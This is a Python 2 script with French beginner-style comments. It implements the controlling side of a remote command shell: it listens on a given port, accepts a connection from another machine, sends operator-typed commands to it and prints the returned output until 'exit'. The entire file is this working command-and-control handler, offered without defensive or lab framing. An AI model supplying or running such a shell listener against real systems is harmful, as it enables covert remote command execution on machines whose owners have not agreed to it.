# coding=utf-8
import socket
import sys
import subprocess as sp
# on import les lib sur une seul ligne
host = sys.argv[1]
port = int(sys.argv[2])
# on cree les variable host et port en ecoute des argument a recevoire
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# on inititalise le socket serveur
s.bind((host, port))
s.listen(5)
print "ecoute en cour %s %d" % (host, port)
# on concataine l'ip et le port
conn, adr = s.accept()
# on accepte les connection
print "[+] Connection étabblie avec l'hote : %s" % (str(adr[0]))
# on affiche les connection avec l'hote

while 1:
    # boucle numéro 1
    command = raw_input("#> ")
    # con cree les commande que l'on va pouvoir utiliser sur la machine
    if command != "exit":
        if command == "": continue
        conn.send(command)
        result = conn.recv(1024)
        total_size = long(result[:16])
        result = result[16:]
        # si la command n'est pas egale a exit on execute
        # si la commande et vide on continue
        # on envoei la commande
        # on recupere le resultat de notre commande
        # on recupere la taille de result en bit
        while total_size > len(result):
            data = conn.recv(1024)
            result += data
        # tant que la taille total en bite est inferieur a la taille de result on recoi les donne
        # le  tout inferireur a 1024 bit
        print result.rstrip("\n ")
    # on affihe les resulta san les retour a la ligne
    else:
        conn.send("exit()")
        print "[+] Connection ferme"
        break
s.close()
